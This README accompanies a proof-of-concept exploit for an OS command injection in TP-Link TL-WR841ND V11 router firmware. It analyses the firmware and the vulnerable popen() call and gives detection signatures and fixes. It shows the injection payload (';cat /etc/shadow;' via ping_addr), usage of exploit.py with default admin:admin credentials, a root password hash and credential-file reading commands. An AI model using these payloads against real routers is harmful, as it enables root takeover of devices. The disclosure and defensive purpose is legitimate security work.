# TP-Link TL-WR841ND V11 — Command Injection PoC & Firmware Analysis

**PoC exploit:** Critical command injection in TP-Link TL-WR841ND V11 firmware (3.16.9 Build 150616). Allows root access via diagnostic ping. CVSS: 9.8.

> This repository contains a proof-of-concept (PoC) exploit script and a full analysis of the vulnerability extracted from the firmware binary. It is provided for educational and authorized security testing only.

----

## Quick Summary

- A Python PoC (`exploit.py`) demonstrates an OS command injection vulnerability in TP-Link TL-WR841ND V11 firmware's diagnostic functions (ping/traceroute web forms).
- Vulnerable endpoint(s): `/userRpm/PingIframeRpm.htm`, `/userRpm/DiagnosticRpm.htm`
- Vulnerable parameter: `ping_addr` (unsanitized user input used in a system ping command)
- Root cause: user input concatenated into a shell command and executed via `popen()`/`system()` call without validation.
- Impact: Full root access on affected devices. Severity: **CRITICAL (CVSS 9.8)**.

---

## Important Legal & Safety Notice

**Do NOT use this PoC against systems you do not own or do not have explicit written permission to test.** Unauthorized use may violate local laws and can result in criminal or civil penalties.

This repository and the included scripts are intended for:
- Security researchers analyzing firmware vulnerabilities on devices they own.
- Network administrators testing and patching their own equipment.

If you are a vendor or administrator and you find this vulnerability in your environment, follow responsible disclosure guidelines and coordinate remediation.

---

## Firmware Overview

| Field | Value |
|-------|-------|
| **Model** | TP-Link TL-WR841N/ND V11 |
| **Firmware** | 3.16.9 Build 150616 |
| **Published** | 2015-09-08 |
| **Architecture** | 32-bit MSB (MIPS32 rel2) |
| **Kernel** | Linux 2.6.31 |
| **LibC** | uClibc |
| **BusyBox** | v1.01 (2015.06.16) |
| **Filesystem** | SquashFS 4.0 (LZO compression) |
| **Web Server** | httpd (Custom MIPS32 ELF, 1.7 MB) |
| **SSH Server** | Dropbear |
| **Status** | **End-of-Life (No patches)** |

### Firmware File Structure

```
wr841nv11_wr841ndv11_en_3_16_9_up_boot(150616).bin  (3.88 MB)
├── [0x00000 - 0x039C0]  TP-Link Header (14,784 bytes)
├── [0x039C0 - 0x120200] uImage / U-Boot (1,165,376 bytes)
│   ├── Magic: 0x27051956 (uImage)
│   ├── Compression: GZIP
│   └── Name: u-boot image
└── [0x120200 - EOF]     SquashFS (2,883,584 bytes)
    ├── Magic: 0x73717368 (hsqs)
    ├── Inodes: 602
    ├── Block Size: 131,072
    ├── Compressor: LZO
    └── Bytes Used: 2,794,097
```

### Extracted Filesystem

```
squashfs-root/
├── bin/          # busybox, sh, cat, ping, ps, etc.
├── dev/          # Device nodes (mtd, tty, etc.)
├── etc/          # Config files, shadow, inittab, rc.d/
├── lib/          # Kernel modules, shared libraries
├── linuxrc -> bin/busybox
├── mnt/
├── proc/
├── root/
├── sbin/         # init, ifconfig, iptables, reboot, etc.
├── sys/
├── tmp/
├── usr/
│   ├── bin/      # httpd, dropbear, arping, tftp
│   └── sbin/     # pppd, dhcp6c, udhcpd, xl2tpd
├── var/
└── web/          # Web interface (HTML, JS, CSS, images)
    ├── dynaform/ # common.js, custom.js, menu.js
    ├── frames/
    ├── help/
    ├── images/
    ├── login/    # encrypt.js (MD5 + Base64 auth)
    ├── oem/
    └── userRpm/  # 100+ .htm pages (management interface)
```

---

## Files in This Repository

| File | Description |
|------|-------------|
| `exploit.py` | Main PoC exploit script (Python 3). Full testing and exploitation workflow with colorized output. |

### Extracted Firmware Data (`extracted/`)

| File | Description |
|------|-------------|
| `extracted/squashfs-root/` | Full extracted SquashFS filesystem |
| `extracted/squashfs.bin` | Raw SquashFS image |
| `extracted/tp_header.bin` | TP-Link proprietary header |
| `extracted/uimage.bin` | U-Boot uImage |
| `extracted/squashfs_decompressed.bin` | Partially decompressed SquashFS data |

---

## How the PoC Works (High Level)

The PoC performs the following phases (implemented in `exploit.py`):

1. **Reconnaissance** — checks target reachability and identifies TP-Link web interface.
2. **Authentication** — attempts HTTP Basic authentication with default credentials (`admin:admin`) and sets headers/cookies.
3. **Vulnerability Scanning** — probes diagnostic endpoints for the presence of a ping form and the `ping_addr` parameter.
4. **Exploitation** — injects commands by sending `;COMMAND;` as the `ping_addr` value. Semicolons terminate the ping command and cause additional shell commands to execute.
5. **Result Parsing** — extracts command output from the HTTP response by looking for JavaScript variables, `<pre>` blocks, or common Unix strings.

The script includes test commands (`id`, `hostname`, `uname -a`, `cat /etc/passwd`, `cat /etc/shadow`, `ifconfig`, `ps`, `cat /proc/version`) to confirm exploitation and enumerate the target.

### Injection Flow

```
Attacker Input:  ;cat /etc/shadow;
                        ↓
HTTP POST:       ping_addr=;cat /etc/shadow;
                        ↓
Firmware Code:   sprintf(g_cmdBuf, "ping %s timeout 5 times 3", user_input)
                        ↓
Shell Command:   ping ;cat /etc/shadow; timeout 5 times 3
                        ↓
Shell Parsing:   [ping] [;] [cat /etc/shadow] [;] [timeout 5 times 3]
                        ↓
Execution:       cat /etc/shadow → output returned to attacker
```

---

## Running the PoC

### Requirements

- Python 3.8+
- `requests` library

```bash
pip install requests
```

### Usage

```bash
# Default target (192.168.0.1)
python3 exploit.py

# Custom target
python3 exploit.py -t 192.168.1.1

# Custom credentials
python3 exploit.py -t 192.168.0.1 -u admin -P mypassword

# Screenshot demo (no device needed)
python3 exploit_demo.py
```

The script will show a disclaimer and ask for confirmation before proceeding.

---

## Vulnerable Code Analysis

### Root Cause

The `httpd` binary (MIPS32 ELF, 1.7 MB) contains a diagnostic ping/traceroute feature that constructs shell commands using user input:

```c
// VULNERABLE CODE (reconstructed from binary analysis)
void diagnosticPing(char *user_input, int timeout, int count) {
    char g_cmdBuf[256];  // Fixed size buffer

    // No input validation — user input directly concatenated
    sprintf(g_cmdBuf, "ping %s timeout %d times %d",
            user_input, timeout, count);

    // Command executed via popen() — shell interprets semicolons
    FILE *fp = popen(g_cmdBuf, "r");
    if (fp) {
        char output[1024];
        while (fgets(output, sizeof(output), fp)) {
            sendResponse(output);
        }
        pclose(fp);
    }
}
```

### Why It Works

1. `sprintf()` builds a command string with user input embedded directly.
2. `popen()` passes the string to `/bin/sh -c`, which interprets shell metacharacters.
3. Semicolons (`;`) act as command separators in bash/sh.
4. `httpd` runs as **root** (PID 1's child), so all injected commands execute as root.
5. No input validation, no sandboxing, no ASLR, no DEP on this MIPS32 system.

### Evidence from Binary Strings

```
strings httpd | grep -E 'popen|g_cmdBuf|Run cmd'

popen
popen error: %s/n
close popen file pointer fp error!
popen res is :%d
%s %d run cmd g_cmdBuf = %s
%s %d runCmd = %s
%s %d runCmd = %s, ret = %d
%s %d: Run cmd %s return ERROR.
%s %d: Run cmd %s return OK.
%s %d: Run cmd = %s
%s %d: Run cmd return %d
```

---

## Hardcoded Credentials & Default Configuration

### Shadow File (`/etc/shadow`)

```
root:$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/:15502:0:99999:7:::
```

- Hash type: MD5 (`$1$`) — trivially crackable with hashcat
- Default password: `admin`

### Default Configuration (`custom.js`)

```javascript
var default_usrname = "admin";
var default_password = "admin";
var default_lan_ip = "192.168.0.1";
var default_host_ip = "192.168.0.23";
var default_target_ip = "192.168.1.23";
var default_dhcps_begin = "192.168.0.100";
var default_dhcps_end = "192.168.0.199";
```

### Login Mechanism

- HTTP Basic Auth (Base64 encoded, no HTTPS)
- Password MD5-hashed client-side in `encrypt.js` before Base64 encoding
- Cookie: `Authorization=Basic <base64(user:pass)>`
- Trivially interceptable over the network

### WPS Configuration (`/etc/wpa2/`)

```
CONFIGURED_MODE=1        # Unconfigured AP
CONFIG_METHODS=0x84
KEY_MGMT=OPEN
USE_UPNP=1
```

---

## Boot & Runtime Services

### Init System (`/etc/inittab`)

```
::sysinit:/etc/rc.d/rcS
::respawn:/sbin/getty ttyS0 115200
::shutdown:/bin/umount -a
```

- Serial console enabled on ttyS0 at 115200 baud (physical access → root shell)

### Boot Script (`/etc/rc.d/rcS`)

```bash
#!/bin/sh
mount -a
mount -t ramfs -n none /tmp
mount -t ramfs -n none /var
ifconfig lo 127.0.0.1 up
/etc/rc.d/rc.modules           # Load kernel modules
/usr/bin/httpd &               # Start web server (as root)
```

### Running Services

| Service | Binary | Port | Notes |
|---------|--------|------|-------|
| Web Server | `httpd` | 80 | Runs as root, vulnerable to command injection |
| SSH | `dropbear` | 22 | Lightweight SSH server |
| DHCP Client | `udhcpc` | — | WAN DHCP |
| DHCP Server | `udhcpd` | 67 | LAN DHCP |
| Syslog | `syslogd` | — | System logging |
| Kernel Log | `klogd` | — | Kernel logging |
| WPA Supplicant | `wpa_supplicant` | — | WiFi authentication |
| Hostapd | `hostapd` | — | AP mode |
| PPPoE | `pppd` | — | WAN PPPoE |
| UPnP | (in httpd) | 1900/UDP | SSDP discovery |
| TFTP | `tftp` | 69/UDP | Used for firmware loading |

### Kernel Modules Loaded

```
# Netfilter/iptables
x_tables, xt_tcpudp, xt_MARK, xt_TCPMSS, xt_comment,
xt_iprange, xt_mac, xt_multiport, xt_string, xt_time,
nf_conntrack, nf_conntrack_ipv4, nf_nat, ip_tables,
iptable_filter, iptable_nat, iptable_raw, ipt_MASQUERADE,
ipt_REDIRECT, ipt_REJECT, ipt_TRIGGER

# QoS
sch_htb, sch_prio, sch_sfq, cls_basic, cls_fw

# VPN
pppol2tp, pptp, af_key, xfrm_user

# Wireless (Atheros)
ath_dfs, ath_hal, wlan, ath_rate_atheros, ath_pci,
wlan_xauth, wlan_ccmp, wlan_tkip, wlan_wep, wlan_acl,
ath_pktlog, wlan_scan_ap
```

---

## Known CVEs for This Device

| CVE | Type | CVSS | Description |
|-----|------|------|-------------|
| **** | Command Injection | 9.8 | **This vulnerability** — auth RCE via diagnostic ping |
| **CVE-2025-25897** | Buffer Overflow | N/A | DoS via `/userRpm/WanStaticIpV6CfgRpm.htm` (`ip` param) |
| **CVE-2025-25901** | Buffer Overflow | 7.5 | DoS via `/userRpm/WanSlaacCfgRpm.htm` (`dnsserver` params) |
| **CVE-2025-53714** | Buffer Overflow | 7.5 | DoS via `/userRpm/WlanNetworkRpm_APC.htm` |
| **CVE-2022-0162** | Cleartext Auth | 7.5 | HTTP Basic Auth transmits credentials in Base64 |
| **CVE-2022-46912** | Firmware Update | 8.8 | Arbitrary code execution via crafted firmware image |
| **CVE-2015-3035** | Directory Traversal | 7.5 | Read arbitrary files via `..` in PATH_INFO to `/login/` |
| **CVE-2026-3622** | OOB Read | 7.5 | UPnP component out-of-bounds read causing crash |

---

## Detection & Indicators of Compromise (IoCs)

- Unexpected `ping` or `traceroute` web requests with unusual characters in `ping_addr` (e.g., semicolons, backticks, pipes).
- Shell command invocations from the web process in system logs that include `;` or sequences like `;id;`.
- Unusual outgoing network connections initiated by the device (reverse shells, DNS exfiltration).
- Presence of unknown accounts or modified `/etc/passwd` or `/etc/shadow`.
- Serial console access on ttyS0 at 115200 baud.

### Suggested IDS Signature

```
alert http any any -> $HOME_NET 80 (
    msg:"TP-Link TL-WR841ND Command Injection Attempt";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/userRpm/PingIframeRpm.htm"; http_uri;
    content:"ping_addr="; http_client_body;
    pcre:"/ping_addr=.*[;|&`]/Pi";
    sid:1000001; rev:1;
)
```

---

## Mitigation & Recommended Fixes

### For Users

1. **Change default credentials** immediately (admin:admin → strong password)
2. **Disable UPnP** if not required
3. **Disable diagnostic features** (ping/traceroute) if not needed
4. **Restrict web interface access** to trusted IPs only
5. **Segment IoT devices** on a separate VLAN
6. **Replace EOL devices** — this router will never receive security patches

### For Vendors / Developers

1. **Input validation/whitelisting**: Accept only valid IP addresses or domain names for diagnostic fields. Reject shell metacharacters (`;`, `|`, `&`, `` ` ``).

2. **Avoid shell interpreters**: Use `execve()` with argument vectors instead of `popen()`/`system()` with concatenated command strings.

3. **Principle of least privilege**: Run the web server process with minimum required privileges; never as root.

4. **Authentication hardening**: Enforce strong admin passwords, implement CSRF protections, support HTTPS.

5. **Firmware signing**: Implement cryptographic firmware image verification before flashing.

6. **Memory protections**: Enable ASLR, DEP/NX, and stack canaries where hardware supports it.

### Fixed Code Example

```c
// SECURE: Input validation + execve
void diagnosticPing(char *user_input, int timeout, int count) {
    // Validate IP address format (digits and dots only)
    for (int i = 0; user_input[i]; i++) {
        if (!isdigit(user_input[i]) && user_input[i] != '.') {
            return;  // Reject invalid input
        }
    }

    // Use execve with argument vector — no shell interpretation
    char timeout_str[16], count_str[16];
    snprintf(timeout_str, sizeof(timeout_str), "%d", timeout);
    snprintf(count_str, sizeof(count_str), "%d", count);

    pid_t pid = fork();
    if (pid == 0) {
        char *args[] = {"ping", user_input, "-W", timeout_str,
                        "-c", count_str, NULL};
        execve("/bin/ping", args, NULL);
        exit(1);
    }
    waitpid(pid, NULL, 0);
}
```

---

## Responsible Disclosure

If you discover this issue on a device you do not own, follow responsible disclosure practices:

1. Do not exploit beyond necessary verification.
2. Contact the vendor's security contact or CERT/CSIRT with details.
3. Provide reproduction steps and suggested mitigations.
4. Coordinate public disclosure with the vendor to allow time for patches.

---

## Contributing

Contributions should focus on:
- Improving detection rules and signatures (IDS/IPS rules).
- Adding safer parsing techniques or authenticated test modes.
- Documenting mitigation/patch status and CVE references when available.

---

## License

This repository does not include an explicit open-source license. By default, all rights are reserved to the repository owner. If you are the repository owner and want to add a license, consider an appropriate license for security research material (e.g., MIT).

---

## Contact / Credits

- **Author:** Matad0r
- **Repository:** TP-Link TL-WR841ND V11 — Command Injection PoC & Analysis
- **CVE:** 
- **Date:** 2026-07-19
